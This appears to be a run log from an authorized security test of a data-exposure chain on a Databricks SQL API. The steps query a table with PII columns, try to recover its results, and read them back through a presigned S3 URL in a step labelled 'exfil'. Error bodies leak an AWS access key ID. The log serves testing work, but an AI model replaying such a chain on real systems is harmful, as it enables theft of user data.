
===== LANE-41 CH-1 COMBINED DATA-EXPOSURE CHAIN (PRIMARY) — 2026-10-02T18:28:45Z =====
request# at start: 0/20 chain_spend={'CH1': 0, 'CH4': 0, 'CH2': 0} aborted=False
[2026-10-02T18:29:32Z] #1 ch1-source-sample sha8=4c5f245f POST /api/2.0/sql/statements
  -> HTTP 200 (47.85s)
  body: {"statement_id":"01f1be8f-1a2d-199c-b26f-ef20dfe074ec","status":{"state":"SUCCEEDED"},"manifest":{"format":"JSON_ARRAY","schema":{"column_count":17,"columns":[{"name":"aggregation","type_text":"STRING","type_name":"STRING","position":0},{"name":"config_hash","type_text":"STRING","type_name":"STRING","position":1},{"name":"created_at_ms","type_text":"BIGINT","type_name":"LONG","position":2},{"name"
  SQL-RESULT: state=SUCCEEDED cols=['aggregation', 'config_hash', 'created_at_ms', 'end_date', 'id', 'location_filter', 'metrics', 'name', 'polygon_wkt', 'run_id', 'start_date', 'status', 'termination_details', 'total', 'user_email', 'user_id', '_rescued_data'] n_rows=3 hash-only

===== LANE-41 CH-1 RESUME (post guard-fix; step-1 cited from receipt) — 2026-10-02T18:32:37Z =====
request# at start: 1/20 chain_spend={'CH1': 1, 'CH4': 0, 'CH2': 0} aborted=False
[2026-10-02T18:32:37Z] #2 ch1-source-result-recover sha8=4c5f245f GET /api/2.0/sql/statements/01f1be8f-1a2d-199c-b26f-ef20dfe074ec/result
  -> HTTP 404 (0.17s)
  body: {"error_code":"ENDPOINT_NOT_FOUND","message":"No API found for 'GET /sql/statements/01f1be8f-1a2d-199c-b26f-ef20dfe074ec/result'","details":[{"@type":"type.googleapis.com/google.rpc.RequestInfo","request_id":"d0001ec3-45c8-4c07-a267-d4880f3932d5","serving_data":""}]}
===== CH-1 PARTIAL — recovery failed — 2026-10-02T18:32:37Z — budget 2/20 chain_spend={'CH1': 2, 'CH4': 0, 'CH2': 0} =====

===== LANE-41 CH-1 RESUME-2 (transport; source leg cited from sealed receipt) — 2026-10-02T18:33:42Z =====
request# at start: 2/20 chain_spend={'CH1': 2, 'CH4': 0, 'CH2': 0} aborted=False
[2026-10-02T18:33:43Z] #3 ch1-transport-issue sha8=4c5f245f POST /api/2.0/sql/statements
  -> HTTP 200 (0.61s)
  body: {"statement_id":"01f1be8f-cb9b-18e0-87b4-c82a18ee3083","status":{"state":"SUCCEEDED"},"manifest":{"format":"JSON_ARRAY","schema":{"column_count":5,"columns":[{"name":"marker","type_text":"STRING","type_name":"STRING","position":0},{"name":"src_stmt_sha8","type_text":"STRING","type_name":"STRING","position":1},{"name":"src_cols","type_text":"STRING","type_name":"STRING","position":2},{"name":"src_r
  SQL-RESULT: state=SUCCEEDED cols=['marker', 'src_stmt_sha8', 'src_cols', 'src_rows', 'identity'] n_rows=-
[2026-10-02T18:33:44Z] #4 ch1-marker-PUT sha8=4c5f245f PUT RAW url-sha8=1fb2b758
  -> HTTP 403 (0.1s)
  body: <?xml version="1.0" encoding="UTF-8"?>
<Error><Code>SignatureDoesNotMatch</Code><Message>The request signature we calculated does not match the signature you provided. Check your key and signing method.</Message><AWSAccessKeyId>ASIAWA6KKHEJHCOWEILO</AWSAccessKeyId><StringToSign>AWS4-HMAC-SHA256
20261002T183343Z
20261002/eu-central-1/s3/aws4_request
0b140123aa76ce54425c422cca0022098f01bde5b3ff94097
[2026-10-02T18:33:45Z] #5 ch1-exfil-GET sha8=4c5f245f GET RAW url-sha8=1fb2b758
  -> HTTP 200 (0.1s)
  body: [["lane41/comb-b817bf04","b817bf04","src_cols=17","src_rows=3","identity=4c5f245f"]]
[2026-10-02T18:33:46Z] #6 ch1-marker-DELETE sha8=4c5f245f DELETE RAW url-sha8=1fb2b758
  -> HTTP 403 (0.07s)
  body: <?xml version="1.0" encoding="UTF-8"?>
<Error><Code>SignatureDoesNotMatch</Code><Message>The request signature we calculated does not match the signature you provided. Check your key and signing method.</Message><AWSAccessKeyId>ASIAWA6KKHEJHCOWEILO</AWSAccessKeyId><StringToSign>AWS4-HMAC-SHA256
20261002T183343Z
20261002/eu-central-1/s3/aws4_request
bbe6e2e8f409340d66cdc14f5a4fb17d8ce57c43b66d7924c
===== CH-1 DEMONSTRATED — 2026-10-02T18:33:46Z — budget 6/20 chain_spend={'CH1': 6, 'CH4': 0, 'CH2': 0} =====

--- CH-1 SUMMARY (2026-10-02T18:33:46Z) ---
verdict: DEMONSTRATED
marker: lane41/comb-b817bf04 (20 B, non-PII, derived from source stmt fingerprint)
source leg: 17 PII cols / 3 rows hash-only — sealed receipt step-1 01f1be8f…; per-row sha8 lost pre-persist, NOT re-burned (single-attempt)
link: sha8=1fb2b758 expiration=2026-10-02T18:48:43.424Z host=bolt-s3-databricks-common.s3.eu-central-1.amazonaws.com
oracle O1: True
oracle O2: False
oracle O3: True
oracle O4: False
oracle O5: PARTIAL-PROVEN
oracle O6: True
put: PUT HTTP 403 — expected capability boundary for GET-signed presigned URLs; exfil demonstration rests on O1+O3 (platform-written object read via presigned GET)
residue: client DELETE HTTP 403 — GET-signed presigned URL is read-only; the object is a platform-managed statement result expiring at platform TTL (2026-10-02T18:48:43.424Z); no client PUT succeeded (HTTP 403), no attacker-created residue; same sanctioned residue class as lane-33 objective (c) (fetch-200, 15-min TTL)
